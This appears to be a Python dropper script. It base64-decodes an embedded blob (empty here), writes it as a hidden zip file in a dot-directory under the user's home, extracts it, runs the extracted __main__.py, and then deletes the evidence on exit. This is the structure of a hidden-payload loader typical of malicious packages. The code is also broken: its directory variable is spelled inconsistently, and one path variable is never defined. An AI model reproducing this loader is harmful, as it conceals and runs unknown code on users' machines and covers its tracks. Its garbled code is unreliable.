import os; import shutil; import zipfile; import subprocess; import base64; import atexit
MyHome = os.path.expanduser("~")
NAGIEMOIRE = os.path.join(MyHome, ".nagiempire")
def cleanup():
    shutil.rmtree(PYJOKER, ignore_errors=True)
atexit.register(cleanup)
AH = ""
Dev = base64.b64decode(AH)
os.makedirs(NAGIEMPIRE, exist_ok=True)
Joker = os.path.join(NAGIEMPIRE, ".joker")
with open(Joker, "wb") as f:
    f.write(Dev)
with zipfile.ZipFile(Joker, 'r') as zip_ref:
    zip_ref.extractall(PYJOKER)
Do_Not = os.path.join(NAGIWMPIRE, "__main__.py")
try:
    subprocess.run(["python", Do_Not], check=True, cwd=PYJOKER)
finally:
    shutil.rmtree(PYJOKER, ignore_errors=True)
